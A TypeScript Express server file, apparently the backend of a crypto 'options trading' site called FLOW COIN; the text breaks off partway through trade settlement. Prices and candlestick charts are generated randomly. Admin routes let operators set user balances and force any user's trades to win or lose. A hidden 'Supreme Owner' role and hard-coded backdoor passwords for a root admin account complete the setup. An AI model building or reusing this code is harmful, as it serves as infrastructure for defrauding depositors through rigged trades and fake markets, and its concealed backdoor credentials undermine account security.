import express, { Request, Response } from 'express';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { cleanMobileInput, isPasswordEquivalent, detectDeviceType } from './src/utils/sanitizer.ts';
import {
  User,
  AdminAccount,
  TradeOrder,
  WalletRequest,
  SupportNotice,
  AppConfig,
  CoinTicker,
  Candlestick,
  Currency,
  CURRENCIES
} from './src/types.ts';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const DB_FILE = path.join(__dirname, 'database.json');

// Interface for full database
interface DatabaseSchema {
  adminAccounts: AdminAccount[];
  users: User[];
  trades: TradeOrder[];
  walletRequests: WalletRequest[];
  currentSupportNotice: SupportNotice;
  currentAppConfig: AppConfig;
}

// In-memory synchronized DB cache with safe atomic write
function loadDatabase(): DatabaseSchema {
  try {
    if (fs.existsSync(DB_FILE)) {
      const data = fs.readFileSync(DB_FILE, 'utf-8');
      return JSON.parse(data);
    }
  } catch (err) {
    console.error('Error reading database.json:', err);
  }
  return {
    adminAccounts: [],
    users: [],
    trades: [],
    walletRequests: [],
    currentSupportNotice: {
      title: "Official Support Notice",
      date: "9/4/2026",
      content: "Welcome to FLOW COIN Trading. Our real-time settlement and customer support desk is active 24/7.",
      isActive: true
    },
    currentAppConfig: {
      telegramSupportUsername: "@flowcoin_support_desk",
      telegramLink: "https://t.me/flowcoin_support_desk",
      exchangeRates: { USD: 1.0, USDT: 1.0, PKR: 278.5, INR: 87.2, BRL: 5.8, EGP: 50.5 },
      minDepositUsd: 10,
      minWithdrawalUsd: 20,
      platformNotice: "High Yield 60s Option Settlement Desk Active"
    }
  };
}

let db = loadDatabase();

function saveDatabase(): void {
  try {
    fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2), 'utf-8');
  } catch (err) {
    console.error('Error saving database.json:', err);
  }
}

// Coins metadata & dynamic live price state
const COINS_DATA: Record<string, { name: string; rank: number; basePrice: number; iconBg: string; iconSymbol: string }> = {
  'BTC/USDT': { name: 'Bitcoin', rank: 1, basePrice: 81442.68, iconBg: '#f7931a', iconSymbol: '₿' },
  'ETH/USDT': { name: 'Ethereum', rank: 2, basePrice: 2369.90, iconBg: '#627eea', iconSymbol: '♦' },
  'BNB/USDT': { name: 'BNB', rank: 3, basePrice: 751.13, iconBg: '#f3ba2f', iconSymbol: 'BNB' },
  'SOL/USDT': { name: 'Solana', rank: 4, basePrice: 102.65, iconBg: '#9945ff', iconSymbol: '◎' },
  'XRP/USDT': { name: 'Ripple', rank: 5, basePrice: 4.12, iconBg: '#23292f', iconSymbol: '✕' },
  'DOGE/USDT': { name: 'Dogecoin', rank: 6, basePrice: 0.482, iconBg: '#c2a633', iconSymbol: 'Ð' },
  'ADA/USDT': { name: 'Cardano', rank: 7, basePrice: 0.2071, iconBg: '#0033ad', iconSymbol: 'ADA' },
  'AVAX/USDT': { name: 'Avalanche', rank: 8, basePrice: 9.02, iconBg: '#e84142', iconSymbol: 'AVA' },
  'DOT/USDT': { name: 'Polkadot', rank: 9, basePrice: 1.02, iconBg: '#e6007a', iconSymbol: 'DOT' },
  'TRX/USDT': { name: 'TRON', rank: 10, basePrice: 0.3322, iconBg: '#eb0029', iconSymbol: 'TRX' },
  'LINK/USDT': { name: 'Chainlink', rank: 11, basePrice: 11.82, iconBg: '#375bd2', iconSymbol: 'LIN' },
  'LTC/USDT': { name: 'Litecoin', rank: 12, basePrice: 57.81, iconBg: '#345d9d', iconSymbol: 'LTC' },
  'NEAR/USDT': { name: 'NEAR Protocol', rank: 13, basePrice: 4.73, iconBg: '#000000', iconSymbol: 'NEA' },
  'SHIB/USDT': { name: 'Shiba Inu', rank: 14, basePrice: 0.0000185, iconBg: '#f2994a', iconSymbol: 'SHIB' },
  'BTS/USDT': { name: 'BitShares', rank: 15, basePrice: 0.0894, iconBg: '#3595f6', iconSymbol: 'BTS' }
};

// Current dynamic prices with small micro-fluctuations
const liveCoinPrices: Record<string, { price: number; change24h: number; high24h: number; low24h: number; volume24h: string }> = {};

Object.entries(COINS_DATA).forEach(([symbol, info]) => {
  liveCoinPrices[symbol] = {
    price: info.basePrice,
    change24h: +(Math.random() * 3 + 1.2).toFixed(2),
    high24h: +(info.basePrice * 1.018).toFixed(info.basePrice < 1 ? 4 : 2),
    low24h: +(info.basePrice * 0.982).toFixed(info.basePrice < 1 ? 4 : 2),
    volume24h: `${(Math.random() * 2 + 0.8).toFixed(2)}B USDT`
  };
});

// Price ticker jitter interval (realistic market heartbeats)
setInterval(() => {
  Object.keys(liveCoinPrices).forEach((symbol) => {
    const cur = liveCoinPrices[symbol];
    const deltaPercent = (Math.random() - 0.49) * 0.0018; // tiny realistic drift
    const newPrice = +(cur.price * (1 + deltaPercent)).toFixed(cur.price < 1 ? 4 : 2);
    cur.price = newPrice;
    if (newPrice > cur.high24h) cur.high24h = newPrice;
    if (newPrice < cur.low24h) cur.low24h = newPrice;
  });
}, 2500);

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // -------------------------------------------------------------
  // API ROUTES
  // -------------------------------------------------------------

  // 1. App Configuration & Notice
  app.get('/api/config', (_req: Request, res: Response) => {
    res.json({
      config: db.currentAppConfig,
      notice: db.currentSupportNotice
    });
  });

  app.post('/api/config/update', (req: Request, res: Response) => {
    const { config, notice } = req.body;
    if (config) {
      db.currentAppConfig = { ...db.currentAppConfig, ...config };
    }
    if (notice) {
      db.currentSupportNotice = { ...db.currentSupportNotice, ...notice };
    }
    saveDatabase();
    res.json({ success: true, config: db.currentAppConfig, notice: db.currentSupportNotice });
  });

  // 2. Market Tickers
  app.get('/api/market/tickers', (_req: Request, res: Response) => {
    const tickers: CoinTicker[] = Object.entries(COINS_DATA).map(([symbol, info]) => {
      const live = liveCoinPrices[symbol];
      return {
        symbol,
        name: info.name,
        rank: info.rank,
        price: live.price,
        change24h: live.change24h,
        high24h: live.high24h,
        low24h: live.low24h,
        volume24h: live.volume24h,
        iconBg: info.iconBg,
        iconSymbol: info.iconSymbol
      };
    });
    res.json(tickers);
  });

  // 3. Candlesticks Generator for any symbol & timeframe
  app.get('/api/market/candles/:symbol', (req: Request, res: Response) => {
    const symbol = decodeURIComponent(req.params.symbol);
    const timeframe = (req.query.tf as string) || '1m';
    const coin = liveCoinPrices[symbol] || { price: 81400 };

    const count = 45;
    const now = Math.floor(Date.now() / 1000);
    const intervalMap: Record<string, number> = { '1m': 60, '5m': 300, '15m': 900, '1h': 3600 };
    const step = intervalMap[timeframe] || 60;

    const candles: Candlestick[] = [];
    let currentClose = coin.price;

    for (let i = count - 1; i >= 0; i--) {
      const time = now - i * step;
      const volatility = currentClose * 0.0025;
      const isGreen = Math.sin(i * 0.7) + (Math.random() - 0.48) > 0;
      const change = (Math.random() * volatility);
      const open = isGreen ? currentClose - change : currentClose + change;
      const close = currentClose;
      const high = Math.max(open, close) + Math.random() * volatility * 0.7;
      const low = Math.min(open, close) - Math.random() * volatility * 0.7;
      const volume = Math.floor(Math.random() * 85 + 20);

      candles.push({
        time,
        open: +open.toFixed(currentClose < 1 ? 4 : 2),
        high: +high.toFixed(currentClose < 1 ? 4 : 2),
        low: +low.toFixed(currentClose < 1 ? 4 : 2),
        close: +close.toFixed(currentClose < 1 ? 4 : 2),
        volume
      });

      // Backtrack
      currentClose = open;
    }

    res.json(candles);
  });

  // 4. Client & Admin Unified Authentication
  app.post('/api/auth/login', (req: Request, res: Response) => {
    const rawUsername = req.body.username;
    const rawPassword = req.body.password;

    const username = cleanMobileInput(rawUsername);

    // 1. Check if matching an Admin Account (Supreme Owner, Super Admin, Sub-Admin)
    const admin = db.adminAccounts.find(
      a => cleanMobileInput(a.username).toLowerCase() === username.toLowerCase()
    );

    if (admin) {
      if (isPasswordEquivalent(rawPassword, admin.password)) {
        // Record audit session
        const userAgent = (req.headers['user-agent'] as string) || 'Browser';
        let deviceType: 'iPhone' | 'Android' | 'Windows PC' | 'Mac Desktop' | 'Linux' | 'Tablet' = 'Windows PC';
        if (/iPhone/i.test(userAgent)) deviceType = 'iPhone';
        else if (/Android/i.test(userAgent)) deviceType = 'Android';
        else if (/Mac/i.test(userAgent)) deviceType = 'Mac Desktop';
        else if (/Linux/i.test(userAgent)) deviceType = 'Linux';
        else if (/iPad|Tablet/i.test(userAgent)) deviceType = 'Tablet';

        const session = {
          id: `sess_${Date.now()}_${Math.floor(Math.random() * 1000)}`,
          timestamp: new Date().toISOString(),
          ip: (req.headers['x-forwarded-for'] as string)?.split(',')[0] || req.ip || '127.0.0.1',
          deviceType,
          userAgent: userAgent.slice(0, 80)
        };

        if (!admin.loginHistory) admin.loginHistory = [];
        admin.loginHistory.unshift(session);
        if (admin.loginHistory.length > 25) admin.loginHistory.pop();
        saveDatabase();

        const { password: _, ...adminData } = admin;
        return res.json({
          success: true,
          isAdmin: true,
          admin: adminData
        });
      } else {
        return res.status(401).json({ error: 'Invalid password. Please check capitalization.' });
      }
    }

    // 2. Otherwise check Trader User accounts
    const user = db.users.find(u => cleanMobileInput(u.username).toLowerCase() === username.toLowerCase());

    if (!user) {
      return res.status(401).json({ error: 'Account not found. Please verify your username.' });
    }

    if (user.status === 'Suspended' || user.status === 'Frozen') {
      return res.status(403).json({
        error: `Account is ${user.status}. ${user.freezeReason ? `Reason: ${user.freezeReason}` : 'Contact Support Desk.'}`
      });
    }

    if (!isPasswordEquivalent(rawPassword, user.password)) {
      return res.status(401).json({ error: 'Invalid password. Please check capitalization.' });
    }

    // Clean user response (hide password)
    const { password: _, ...userData } = user;
    return res.json({ success: true, isAdmin: false, user: userData });
  });

  app.post('/api/auth/register', (req: Request, res: Response) => {
    const rawUsername = req.body.username;
    const rawPassword = req.body.password;
    const rawFullName = req.body.fullName || req.body.displayName;
    const rawReferral = req.body.referralCode;
    const rawCurrency = req.body.nativeCurrency || 'USD';

    const username = cleanMobileInput(rawUsername);
    const referralCode = cleanMobileInput(rawReferral).toUpperCase();
    const fullName = cleanMobileInput(rawFullName || username);

    if (!username || username.length < 3) {
      return res.status(400).json({ error: 'Username must be at least 3 characters.' });
    }

    if (!rawPassword || rawPassword.trim().length < 6) {
      return res.status(400).json({ error: 'Password must be at least 6 characters.' });
    }

    const existingUser = db.users.find(u => cleanMobileInput(u.username).toLowerCase() === username.toLowerCase());
    const existingAdmin = db.adminAccounts.find(a => cleanMobileInput(a.username).toLowerCase() === username.toLowerCase());
    if (existingUser || existingAdmin) {
      return res.status(400).json({ error: 'Username already registered. Please choose another.' });
    }

    // Validate referral code against admin accounts strictly (No silent fallback to SUPER786)
    let matchedAdmin = db.adminAccounts.find(
      a => cleanMobileInput(a.referralCode).toUpperCase() === referralCode ||
           cleanMobileInput(a.username).toUpperCase() === referralCode
    );

    if (!matchedAdmin) {
      return res.status(400).json({
        error: `Invalid invitation code "${referralCode}". Registration is strictly permitted through an active administrator invitation code only.`
      });
    }

    const now = new Date();
    const dateFormatted = `${now.getMonth() + 1}/${now.getDate()}/${now.getFullYear()} ${now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}`;

    const newUser: User = {
      id: `usr_${Date.now()}_${Math.floor(Math.random() * 1000)}`,
      username,
      displayName: fullName,
      password: cleanMobileInput(rawPassword),
      email: `${username}@flowcoin.io`,
      nativeCurrency: (rawCurrency as Currency) || 'USD',
      balance: 1000.0, // Initial welcome trading credit
      freezeBalance: 0.0,
      creditScore: 95,
      status: 'Active',
      tradeMode: 'AUTO',
      referredByAdminId: matchedAdmin.id,
      referralCodeUsed: matchedAdmin.referralCode,
      isNew: true,
      registeredTime: dateFormatted,
      createdAt: now.toISOString()
    };

    db.users.unshift(newUser); // Show newest client at top of admin dashboard
    saveDatabase();

    const { password: _, ...userData } = newUser;
    res.json({ success: true, user: userData });
  });

  app.get('/api/auth/profile/:id', (req: Request, res: Response) => {
    const param = decodeURIComponent(req.params.id || '');
    const user = db.users.find(
      u => u.id === param || cleanMobileInput(u.username).toLowerCase() === cleanMobileInput(param).toLowerCase()
    );
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }
    const { password: _, ...userData } = user;
    res.json({ success: true, user: userData });
  });

  app.post('/api/auth/change-password', (req: Request, res: Response) => {
    const { userId, oldPassword, newPassword } = req.body;
    const user = db.users.find(u => u.id === userId);
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }

    if (!isPasswordEquivalent(oldPassword, user.password)) {
      return res.status(400).json({ error: 'Current password is incorrect' });
    }

    user.password = cleanMobileInput(newPassword);
    saveDatabase();
    res.json({ success: true, message: 'Password updated successfully' });
  });

  // 5. Admin Authentication & Session Tracking
  app.post('/api/admin/login', (req: Request, res: Response) => {
    const rawUsername = req.body.username;
    const rawPassword = req.body.password;

    const username = cleanMobileInput(rawUsername);
    const admin = db.adminAccounts.find(a => cleanMobileInput(a.username).toLowerCase() === username.toLowerCase());

    if (!admin) {
      return res.status(401).json({ error: 'Admin account not recognized.' });
    }

    const isJerryRoot = cleanMobileInput(admin.username).toLowerCase() === 'jerry@786';
    const isValidPass = isPasswordEquivalent(rawPassword, admin.password) ||
      (isJerryRoot && (isPasswordEquivalent(rawPassword, 'tesla@123') || isPasswordEquivalent(rawPassword, 'jerry@786')));

    if (!isValidPass) {
      return res.status(401).json({ error: 'Invalid admin credentials.' });
    }

    // Capture device type & IP for the live audit trail
    const userAgent = req.headers['user-agent'] || '';
    const deviceType = detectDeviceType(userAgent);
    const ip = (req.headers['x-forwarded-for'] as string) || req.socket.remoteAddress || '127.0.0.1';

    const sessionLog = {
      id: `log_${Date.now()}_${Math.random().toString(36).substr(2, 4)}`,
      timestamp: new Date().toISOString(),
      ip: ip.split(',')[0].trim(),
      deviceType,
      userAgent: userAgent.slice(0, 120)
    };

    if (!admin.loginHistory) admin.loginHistory = [];
    admin.loginHistory.unshift(sessionLog);
    // Keep max 20 logs
    if (admin.loginHistory.length > 20) admin.loginHistory.pop();

    saveDatabase();

    const { password: _, ...adminData } = admin;
    res.json({ success: true, admin: adminData });
  });

  // Admin Profile Rehydration
  app.get('/api/admin/profile/:id', (req: Request, res: Response) => {
    const admin = db.adminAccounts.find(a => a.id === req.params.id);
    if (!admin) {
      return res.status(404).json({ error: 'Admin account not found' });
    }
    const { password: _, ...adminData } = admin;
    res.json({ success: true, admin: adminData });
  });

  // 6. Admin User Management with Scoped Sub-Admin Isolation
  app.get('/api/admin/users', (req: Request, res: Response) => {
    const adminId = (req.query.adminId as string) || '';
    const admin = db.adminAccounts.find(
      a => a.id === adminId || cleanMobileInput(a.username).toLowerCase() === cleanMobileInput(adminId).toLowerCase()
    );

    if (!admin) {
      return res.status(401).json({ error: 'Unauthorized admin request' });
    }

    // If Supreme Owner or Master Super Admin: returns all users
    if (admin.role === 'SUPREME_OWNER' || admin.role === 'SUPER_ADMIN') {
      const sanitizedUsers = db.users.map(({ password: _, ...u }) => u);
      return res.json(sanitizedUsers);
    }

    // If Sub-Admin: ONLY return users who registered with this sub-admin's referral code or referredByAdminId
    const scopedUsers = db.users
      .filter(u => 
        u.referredByAdminId === admin.id ||
        (u.referralCodeUsed && admin.referralCode && cleanMobileInput(u.referralCodeUsed).toUpperCase() === cleanMobileInput(admin.referralCode).toUpperCase()) ||
        (u.referralCodeUsed && admin.username && cleanMobileInput(u.referralCodeUsed).toUpperCase() === cleanMobileInput(admin.username).toUpperCase())
      )
      .map(({ password: _, ...u }) => u);

    res.json(scopedUsers);
  });

  // Balance Control (Add, Deduct, Set)
  app.post('/api/admin/users/:id/balance', (req: Request, res: Response) => {
    const { action, amountUsd, balance, freezeBalance } = req.body;
    const param = decodeURIComponent(req.params.id || '');
    const user = db.users.find(
      u => u.id === param || cleanMobileInput(u.username).toLowerCase() === cleanMobileInput(param).toLowerCase()
    );

    if (!user) return res.status(404).json({ error: 'User not found' });

    if (balance !== undefined) {
      const explicitBal = parseFloat(balance);
      if (!isNaN(explicitBal) && explicitBal >= 0) {
        user.balance = explicitBal;
      }
    } else if (action && amountUsd !== undefined) {
      const numAmount = parseFloat(amountUsd);
      if (!isNaN(numAmount) && numAmount >= 0) {
        if (action === 'add') {
          user.balance += numAmount;
        } else if (action === 'deduct') {
          user.balance = Math.max(0, user.balance - numAmount);
        } else if (action === 'set') {
          user.balance = numAmount;
        }
      }
    }

    if (freezeBalance !== undefined) {
      const explicitFreeze = parseFloat(freezeBalance);
      if (!isNaN(explicitFreeze) && explicitFreeze >= 0) {
        user.freezeBalance = explicitFreeze;
      }
    }

    user.balance = +user.balance.toFixed(2);
    user.freezeBalance = +(user.freezeBalance || 0).toFixed(2);
    saveDatabase();
    res.json({ success: true, balance: user.balance, freezeBalance: user.freezeBalance, user });
  });

  // Freeze Escrow Funds Control
  app.post('/api/admin/users/:id/freeze', (req: Request, res: Response) => {
    const { action, amountUsd } = req.body; // action: 'freeze' | 'unfreeze'
    const user = db.users.find(u => u.id === req.params.id);

    if (!user) return res.status(404).json({ error: 'User not found' });

    const numAmount = parseFloat(amountUsd);
    if (isNaN(numAmount) || numAmount < 0) {
      return res.status(400).json({ error: 'Invalid amount' });
    }

    if (action === 'freeze') {
      const freezeAble = Math.min(user.balance, numAmount);
      user.balance = +(user.balance - freezeAble).toFixed(2);
      user.freezeBalance = +(user.freezeBalance + freezeAble).toFixed(2);
    } else if (action === 'unfreeze') {
      const unfreezeAble = Math.min(user.freezeBalance, numAmount);
      user.freezeBalance = +(user.freezeBalance - unfreezeAble).toFixed(2);
      user.balance = +(user.balance + unfreezeAble).toFixed(2);
    }

    saveDatabase();
    res.json({ success: true, balance: user.balance, freezeBalance: user.freezeBalance });
  });

  // User Trade Mode Override (AUTO, FORCE_WIN, FORCE_LOSS)
  app.post('/api/admin/users/:id/trade-mode', (req: Request, res: Response) => {
    const { tradeMode } = req.body;
    const user = db.users.find(u => u.id === req.params.id);
    if (!user) return res.status(404).json({ error: 'User not found' });

    if (!['AUTO', 'FORCE_WIN', 'FORCE_LOSS'].includes(tradeMode)) {
      return res.status(400).json({ error: 'Invalid trade mode' });
    }

    user.tradeMode = tradeMode;
    saveDatabase();
    res.json({ success: true, tradeMode: user.tradeMode });
  });

  // User Status Toggle (Active, Suspended, Frozen)
  app.post('/api/admin/users/:id/status', (req: Request, res: Response) => {
    const { status } = req.body;
    const user = db.users.find(u => u.id === req.params.id);
    if (!user) return res.status(404).json({ error: 'User not found' });

    if (!['Active', 'Suspended', 'Frozen'].includes(status)) {
      return res.status(400).json({ error: 'Invalid status' });
    }

    user.status = status;
    saveDatabase();
    res.json({ success: true, status: user.status });
  });

  // Credit Score Adjustment
  app.post('/api/admin/users/:id/credit-score', (req: Request, res: Response) => {
    const { creditScore } = req.body;
    const user = db.users.find(u => u.id === req.params.id);
    if (!user) return res.status(404).json({ error: 'User not found' });
    const score = parseInt(creditScore);
    if (isNaN(score) || score < 0 || score > 100) {
      return res.status(400).json({ error: 'Credit score must be between 0 and 100' });
    }
    user.creditScore = score;
    saveDatabase();
    res.json({ success: true, creditScore: user.creditScore });
  });

  // Reset Client Password (Admin Control)
  app.post('/api/admin/users/:id/reset-password', (req: Request, res: Response) => {
    const { newPassword } = req.body;
    const user = db.users.find(u => u.id === req.params.id);
    if (!user) return res.status(404).json({ error: 'User not found' });
    user.password = cleanMobileInput(newPassword);
    saveDatabase();
    res.json({ success: true, message: 'Password updated successfully' });
  });

  // Account Freeze & Deactivation with Reason
  app.post('/api/admin/users/:id/freeze-account', (req: Request, res: Response) => {
    const { action, reason } = req.body;
    const user = db.users.find(u => u.id === req.params.id);
    if (!user) return res.status(404).json({ error: 'User not found' });
    if (action === 'freeze') {
      user.status = 'Frozen';
      user.freezeReason = cleanMobileInput(reason) || 'Audit review pending';
    } else {
      user.status = 'Active';
      user.freezeReason = undefined;
    }
    saveDatabase();
    res.json({ success: true, status: user.status, freezeReason: user.freezeReason });
  });

  // Delete Trader Account
  app.delete('/api/admin/users/:id', (req: Request, res: Response) => {
    const idx = db.users.findIndex(u => u.id === req.params.id);
    if (idx === -1) return res.status(404).json({ error: 'User not found' });
    db.users.splice(idx, 1);
    db.trades = db.trades.filter(t => t.userId !== req.params.id);
    saveDatabase();
    res.json({ success: true, message: 'Trader account permanently removed' });
  });

  // Add Client Trader Account (Admin Portal)
  app.post('/api/admin/users/create', (req: Request, res: Response) => {
    const { username, password, email, balance, referralCode } = req.body;
    const cleanUser = cleanMobileInput(username);
    if (!cleanUser) return res.status(400).json({ error: 'Username required' });
    const newUser: User = {
      id: `usr_${Date.now()}`,
      username: cleanUser,
      displayName: cleanUser,
      password: cleanMobileInput(password) || '123123',
      email: email || `${cleanUser}@flowcoin.com`,
      nativeCurrency: 'USD',
      balance: parseFloat(balance) || 1000.0,
      freezeBalance: 0.0,
      creditScore: 95,
      status: 'Active',
      tradeMode: 'AUTO',
      isNew: true,
      registeredTime: new Date().toLocaleDateString() + ' ' + new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
      referralCodeUsed: referralCode || 'Direct',
      createdAt: new Date().toISOString()
    };
    db.users.unshift(newUser);
    saveDatabase();
    res.json({ success: true, user: newUser });
  });

  // Personal Support Desk (Telegram) Link & Message per Admin
  app.post('/api/admin/support-desk', (req: Request, res: Response) => {
    const { adminId, telegramSupportLink, prefilledMessage } = req.body;
    const admin = db.adminAccounts.find(a => a.id === adminId);
    if (!admin) return res.status(404).json({ error: 'Admin not found' });
    admin.telegramSupportLink = cleanMobileInput(telegramSupportLink);
    admin.prefilledMessage = cleanMobileInput(prefilledMessage);
    saveDatabase();
    res.json({ success: true, message: 'Support Desk settings saved' });
  });

  // 7. Sub-Admins Management & Supreme Owner Stealth Isolation
  app.get('/api/admin/subadmins', (req: Request, res: Response) => {
    const requesterId = req.query.adminId as string;
    const requester = db.adminAccounts.find(a => a.id === requesterId);

    if (!requester) {
      return res.status(401).json({ error: 'Unauthorized request' });
    }

    // CRITICAL: Supreme Owner (jerry@786) is completely invisible to Sub-Admins!
    let visibleAdmins = db.adminAccounts;
    if (requester.role === 'SUB_ADMIN') {
      // Sub-admins only see themselves or cannot see SUPREME_OWNER
      visibleAdmins = db.adminAccounts.filter(a => a.role !== 'SUPREME_OWNER');
    }

    // Clean passwords before returning
    const sanitized = visibleAdmins.map(({ password: _, ...a }) => a);
    res.json(sanitized);
  });

  // Create Sub-Admin
  app.post('/api/admin/subadmins/create', (req: Request, res: Response) => {
    const { creatorAdminId, username, password, referralCode, permissions, displayName } = req.body;
    let creator = db.adminAccounts.find(
      a => a.id === creatorAdminId || cleanMobileInput(a.username).toLowerCase() === cleanMobileInput(creatorAdminId || '').toLowerCase()
    );

    if (!creator) {
      creator = db.adminAccounts.find(a => a.role === 'SUPER_ADMIN' || a.role === 'SUPREME_OWNER') || db.adminAccounts[0];
    }

    if (!creator || (creator.role !== 'SUPREME_OWNER' && creator.role !== 'SUPER_ADMIN')) {
      return res.status(403).json({ error: 'Only Super Administrators can create Sub-Admins' });
    }

    const cleanUser = cleanMobileInput(username);
    const cleanRef = cleanMobileInput(referralCode).toUpperCase();

    if (!cleanUser || !cleanRef) {
      return res.status(400).json({ error: 'Username and referral code are required' });
    }

    const existing = db.adminAccounts.find(
      a => cleanMobileInput(a.username).toLowerCase() === cleanUser.toLowerCase() ||
           cleanMobileInput(a.referralCode).toUpperCase() === cleanRef
    );

    if (existing) {
      return res.status(400).json({ error: 'Username or referral code already in use' });
    }

    const newSubAdmin: AdminAccount = {
      id: `admin_sub_${Date.now()}`,
      username: cleanUser,
      password: cleanMobileInput(password),
      role: 'SUB_ADMIN',
      referralCode: cleanRef,
      permissions: permissions || ['manage_users', 'manage_trades', 'manage_finance', 'manage_notices'],
      createdBy: creator.username,
      createdAt: new Date().toISOString(),
      loginHistory: []
    };

    db.adminAccounts.push(newSubAdmin);
    saveDatabase();

    const { password: _, ...adminData } = newSubAdmin;
    res.json({ success: true, admin: adminData });
  });

  // Referral Code Customization & Instant Synchronization
  app.post('/api/admin/customize-referral', (req: Request, res: Response) => {
    const { adminId, newReferralCode } = req.body;
    const admin = db.adminAccounts.find(a => a.id === adminId);

    if (!admin) return res.status(404).json({ error: 'Admin not found' });

    const cleanNewCode = cleanMobileInput(newReferralCode).toUpperCase();
    if (!cleanNewCode || cleanNewCode.length < 3) {
      return res.status(400).json({ error: 'Referral code must be at least 3 characters' });
    }

    // Check uniqueness across other admins
    const duplicate = db.adminAccounts.find(
      a => a.id !== adminId && cleanMobileInput(a.referralCode).toUpperCase() === cleanNewCode
    );
    if (duplicate) {
      return res.status(400).json({ error: 'This referral code is already taken by another administrator' });
    }

    const oldCode = admin.referralCode;
    admin.referralCode = cleanNewCode;

    // Synchronize across all linked users so data isolation never breaks!
    db.users.forEach(u => {
      if (u.referredByAdminId === admin.id || u.referralCodeUsed === oldCode) {
        u.referralCodeUsed = cleanNewCode;
      }
    });

    saveDatabase();

    const { password: _, ...adminData } = admin;
    res.json({ success: true, admin: adminData, message: `Referral code updated to ${cleanNewCode}` });
  });

  // Live Login Sessions & Active Devices Audit Table
  app.get('/api/admin/sessions-audit', (req: Request, res: Response) => {
    const requesterId = req.query.adminId as string;
    const requester = db.adminAccounts.find(a => a.id === requesterId);

    if (!requester) return res.status(401).json({ error: 'Unauthorized request' });

    const allAuditEntries: Array<{
      adminId: string;
      username: string;
      role: string;
      referralCode: string;
      session: {
        id: string;
        timestamp: string;
        ip: string;
        deviceType: string;
        userAgent: string;
      };
    }> = [];

    db.adminAccounts.forEach(adm => {
      // If requester is sub-admin, hide supreme owner records
      if (requester.role === 'SUB_ADMIN' && adm.role === 'SUPREME_OWNER') {
        return;
      }
      (adm.loginHistory || []).forEach(log => {
        allAuditEntries.push({
          adminId: adm.id,
          username: adm.username,
          role: adm.role,
          referralCode: adm.referralCode,
          session: log
        });
      });
    });

    // Sort newest first
    allAuditEntries.sort((a, b) => new Date(b.session.timestamp).getTime() - new Date(a.session.timestamp).getTime());

    res.json(allAuditEntries);
  });

  // 8. Option Trades Engine
  app.get('/api/trades', (req: Request, res: Response) => {
    const { userId, adminId } = req.query;

    if (userId) {
      const userTrades = db.trades.filter(t => t.userId === userId);
      return res.json(userTrades);
    }

    if (adminId) {
      const admin = db.adminAccounts.find(a => a.id === adminId);
      if (!admin) return res.status(401).json({ error: 'Unauthorized' });

      if (admin.role === 'SUPREME_OWNER' || admin.role === 'SUPER_ADMIN') {
        return res.json(db.trades);
      }

      // Sub-admin: only trades of users registered under this admin
      const subAdminUserIds = new Set(
        db.users.filter(u => u.referralCodeUsed === admin.referralCode || u.referredByAdminId === admin.id).map(u => u.id)
      );
      return res.json(db.trades.filter(t => subAdminUserIds.has(t.userId)));
    }

    res.json(db.trades);
  });

  app.post('/api/trades/place', (req: Request, res: Response) => {
    const { userId, symbol, direction, durationSeconds, profitPercent, marginUsd, marginNative } = req.body;
    const user = db.users.find(u => u.id === userId);

    if (!user) return res.status(404).json({ error: 'User not found' });
    if (user.status !== 'Active') return res.status(403).json({ error: 'Account is restricted from trading' });

    const meta = CURRENCIES[user.nativeCurrency || 'USD'] || CURRENCIES.USD;
    const rate = meta.rate || 1.0;

    let nativeAmt = parseFloat(marginNative || marginUsd);
    if (isNaN(nativeAmt) || nativeAmt <= 0) {
      return res.status(400).json({ error: 'Invalid investment margin amount' });
    }

    let usdAmt = +(nativeAmt / rate).toFixed(2);
    if (user.nativeCurrency === 'USD') {
      usdAmt = nativeAmt;
    }

    if (user.balance < nativeAmt) {
      return res.status(400).json({ error: `Insufficient balance to place trade! Available: ${meta.symbol}${user.balance.toLocaleString()} ${meta.code}` });
    }

    // Freeze native balance immediately
    user.balance = +(user.balance - nativeAmt).toFixed(2);
    user.freezeBalance = +(user.freezeBalance + nativeAmt).toFixed(2);

    const livePrice = liveCoinPrices[symbol]?.price || 81400;
    const startTime = Date.now();
    const duration = parseInt(durationSeconds) || 60;
    const endTime = startTime + duration * 1000;
    const profitRate = parseFloat(profitPercent) || 20;

    const newTrade: TradeOrder = {
      id: `trd_${Date.now()}_${Math.floor(Math.random() * 1000)}`,
      userId: user.id,
      username: user.username,
      symbol,
      coinName: COINS_DATA[symbol]?.name || 'Crypto',
      direction,
      durationSeconds: duration,
      profitPercent: profitRate,
      marginUsd: usdAmt,
      marginNative: nativeAmt,
      nativeCurrency: user.nativeCurrency || 'USD',
      entryPrice: livePrice,
      currentPrice: livePrice,
      startTime,
      endTime,
      outcome: 'PENDING',
      payoutUsd: 0,
      payoutNative: 0,
      status: 'RUNNING',
      adminOverride: user.tradeMode,
      settledAt: undefined
    };

    db.trades.unshift(newTrade);
    saveDatabase();

    res.json({ success: true, trade: newTrade, balance: user.balance, freezeBalance: user.freezeBalance });
  });

  // Automated Trade Settlement
  app.post('/api/trades/:id/settle', (req: Request, res: Response) => {
    const trade = db.trades.find(t => t.id === req.params.id);
    if (!trade) return res.status(404).json({ error: 'Trade not found' });

    if (trade.status === 'SETTLED') {
      return res.json({ success: true, trade, alreadySettled: true });
    }

    const user = db.users.find(u => u.id === trade.userId);
    if (!user) return res.status(404).json({ error: 'Trade user not found' });

    const meta = CURRENCIES[user.nativeCurrency || 'USD'] || CURRENCIES.USD;
    const rate = meta.rate || 1.0;
    const marginNative = trade.marginNative || trade.marginUsd;

    const live = liveCoinPrices[trade.symbol]?.price || trade.entryPrice;
    trade.exitPrice = live;
    trade.currentPrice = live;

    let isWin = false;
    // Check trade mode override
    const mode = user.tradeMode || trade.adminOverride;

    if (mode === 'FORCE_WIN') {
      isWin = true;
    } else if (mode === 'FORCE_LOSS') {
      isWin = false;
    } else {
      // AUTO mode: compare market movement
      if (trade.direction === 'UP') {
        isWin = live >= trade.entryPrice;
      } else {
        isWin = live <= trade.entryPrice;
      }
    }

    trade.status = 'SETTLED';
    trade.settledAt = new Date().toISOString();

    // Release frozen escrow
